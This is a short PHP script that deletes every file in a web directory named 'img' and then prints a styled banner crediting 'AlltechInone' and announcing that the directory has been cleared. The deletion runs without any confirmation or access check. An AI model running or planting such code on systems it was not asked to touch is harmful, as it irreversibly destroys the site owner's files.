<?php
$files = glob('img/*'); // get all file names
foreach($files as $file){ // iterate files
  if(is_file($file))
    unlink($file); // delete file
}
echo("<center><b><body bgcolor=\"#000000\"><font color=\'Crimson\'>
<center><font size=6pt color=Crimson><b>Cleaner By AlltechInone:)</b></font></center><br><center><font size=5pt color=\'SeaGreen\'>img Dir Cleared</font></center><br>    </font></html>");
?>